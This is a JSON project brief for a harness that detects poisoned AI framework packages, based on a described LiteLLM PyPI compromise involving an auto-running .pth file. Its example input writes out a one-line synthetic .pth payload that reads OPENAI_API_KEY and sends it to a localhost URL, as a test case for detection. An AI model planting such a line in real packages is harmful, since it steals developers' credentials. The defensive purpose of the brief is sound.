@@ -1,0 +1,73 @@
+{
+  "id": "ai-gateway-supply-chain-integrity-harness",
+  "title": "Poisoned Gateway: A Supply Chain Integrity Harness for AI Framework Dependencies",
+  "one_line": "Build a harness that detects supply chain compromise indicators in AI framework packages before they execute in CI/CD or production environments.",
+  "vertical": "Developer Tools",
+  "difficulty": "Intermediate",
+  "build_type": "Harness",
+  "status": "Open",
+  "run_level": "R3",
+  "provenance": "failure-derived",
+  "month": "2026-03",
+  "draft": true,
+  "failure_family": "supply chain",
+  "failure_story": {
+    "what_happened": "On March 24, 2026, two malicious versions of LiteLLM (1.82.7 and 1.82.8) were published to PyPI after an attacker compromised the maintainer's credentials via a poisoned Trivy GitHub Action in LiteLLM's CI/CD pipeline. The packages installed a .pth file (litellm_init.pth) that auto-executed on every Python process startup, targeting cloud credentials, API keys, SSH keys, and CI/CD tokens. LiteLLM is a widely used AI gateway library with roughly 95 million monthly downloads, used as a dependency by CrewAI, DSPy, Microsoft GraphRAG, Browser-Use, and dozens of other AI agent frameworks. The packages were live for approximately 40 minutes and accumulated tens of thousands of downloads before PyPI quarantined them.",
+    "root_cause_read": "The CI/CD pipeline referenced a third-party security scanning action (Trivy) by version tag rather than commit hash, allowing the attacker to inject malicious publish behavior by compromising the action without changing the pin. AI gateway packages are unusually high-value supply chain targets because they sit between the application and every AI provider API, typically holding all provider API keys simultaneously. Projects using poetry.lock or uv.lock with hash-verified lockfiles were fully protected; projects using bare pip install with a loose version range were immediately vulnerable at the next install.",
+    "engineering_lesson": "A supply chain integrity harness that audits .pth file additions, verifies installed package hashes against a lockfile baseline, and scans new packages for credential-access patterns would have flagged the malicious version before any execution. The attack succeeded because there was no install-time check between the PyPI download and the first Python process startup."
+  },
+  "sources": [
+    "https://futuresearch.ai/blog/litellm-pypi-supply-chain-attack/",
+    "https://snyk.io/blog/poisoned-security-scanner-backdooring-litellm/",
+    "https://oecd.ai/en/incidents/2026-03-31-e055",
+    "https://www.trendmicro.com/en_us/research/26/c/inside-litellm-supply-chain-compromise.html"
+  ],
+  "primary_source_note": "The liteLLM official security update at docs.litellm.ai/blog/security-update-march-2026 and Snyk's technical breakdown are the primary sources. Attach both and verify claims against the liteLLM GitHub commit history before publish.",
+  "field_signals": [
+    "The malicious .pth file executed automatically on every Python process startup when litellm was installed, requiring no user action after the initial pip install.",
+    "Projects pinning dependencies via a lockfile (poetry.lock, uv.lock) with hash verification were fully protected; bare pip install with a loose version range was immediately vulnerable.",
+    "The attack targeted Kubernetes cluster secrets, attempting to mount host filesystems and install a persistent systemd backdoor polling for additional payloads.",
+    "The attacker gained publish access by compromising a third-party GitHub Action (Trivy) that was pinned by version tag rather than commit hash, so the LiteLLM repo itself was never directly modified."
+  ],
+  "reliability_focus": ["supply chain integrity", "dependency verification", "secret exposure detection"],
+  "why_it_matters": "AI gateway packages sit between the application and every AI provider API, holding the keys to an entire stack. A compromised gateway executes before any application logic runs, which means standard application security controls cannot catch it. The missing artifact is not a better vulnerability scanner but a harness that verifies the integrity of AI framework dependencies at install time and in CI, before a compromised version executes in any environment.",
+  "persona": "Team using an LLM routing or gateway library (LiteLLM, LangChain, or similar) as a dependency in a production AI stack",
+  "current_workflow": "Dependencies are installed from PyPI with a loose version range, the CI/CD pipeline runs functional tests and linters, but no step verifies package file hashes, audits .pth files added by AI framework packages, or scans installed site-packages for credential-access patterns before the first process starts.",
+  "ai_workflow": "The harness installs declared dependencies in an isolated environment and then runs three checks: verify all installed AI framework package hashes against a known-good lockfile baseline; enumerate any .pth files added by monitored packages and flag unexpected additions; scan the installed site-packages of flagged packages for common credential-access patterns such as reads of environment variables matching API key naming conventions. It emits a pass or hold verdict with the specific file, package, and pattern that triggered each flag.",
+  "inputs": [
+    "a requirements file and a hash-pinned lockfile (poetry.lock, uv.lock, or pip-compile output) for the project under test",
+    "a known-good hash baseline for the monitored AI framework packages, generated from a prior clean install",
+    "a list of AI gateway and framework packages to monitor (for example: litellm, langchain, anthropic, openai)"
+  ],
+  "outputs": [
+    "a hash mismatch report naming any installed package whose hash diverges from the lockfile",
+    "a .pth file inventory listing any .pth file installed by a monitored package, with file content",
+    "a credential pattern scan flagging any file in site-packages that reads environment variables matching API key patterns",
+    "a pass or hold verdict naming the specific indicator and package"
+  ],
+  "definition_of_done": "Against a synthetic package that installs a .pth file reading an API key environment variable and sending it to a localhost endpoint, the harness detects the .pth file, names the package and file, flags the credential pattern, and issues a hold verdict; against a clean install of the same package without the .pth file it issues a pass verdict and does not false-flag legitimate .pth files from standard tooling such as editable installs.",
+  "example_input": "A synthetic litellm-style package at version 1.82.9 that installs litellm_init.pth containing: import os; import urllib.request; urllib.request.urlopen('http://localhost:9001/?k=' + os.environ.get('OPENAI_API_KEY', ''))",
+  "example_output": "Hold verdict: litellm-test==1.82.9 installed litellm_init.pth. File content matches credential-exfil pattern: OPENAI_API_KEY read and sent to external URL. Hash 4a2f... does not match lockfile hash 8c3d.... Monitored packages adding .pth files: 1 (litellm-test). Recommendation: quarantine package, pin by hash, audit CI pipeline for action digest pinning.",
+  "data_plan": "synthetic",
+  "non_goals": [
+    "replacing full SAST or SCA tooling for application code",
+    "auditing how the application itself handles credentials",
+    "monitoring package maintainer accounts or upstream repositories",
+    "runtime detection after a compromised package has already executed"
+  ],
+  "evaluation_ideas": [
+    "true positive rate on synthetic packages with injected .pth files versus known-clean packages of equal complexity",
+    "false positive rate on legitimate .pth files from standard tooling such as editable installs and distutils",
+    "detection completeness: harness must flag hash mismatch, .pth file, and credential pattern as three distinct signals on the synthetic case",
+    "CI integration time: harness must complete in under 30 seconds on a typical AI project dependency set"
+  ],
+  "suggested_tools": [
+    "pip-audit for known vulnerability scanning alongside integrity checks",
+    "uv or poetry for lockfile-based installs with hash verification",
+    "bandit or semgrep for credential pattern detection in installed files"
+  ],
+  "thesis_questions": [
+    "Would hash-pinning alone have protected all affected projects, or does .pth file scanning add a distinct signal for cases where lockfiles are absent?",
+    "How do you baseline legitimate .pth files to minimize false positives in a Python project with complex dev dependencies?"
+  ]
+}
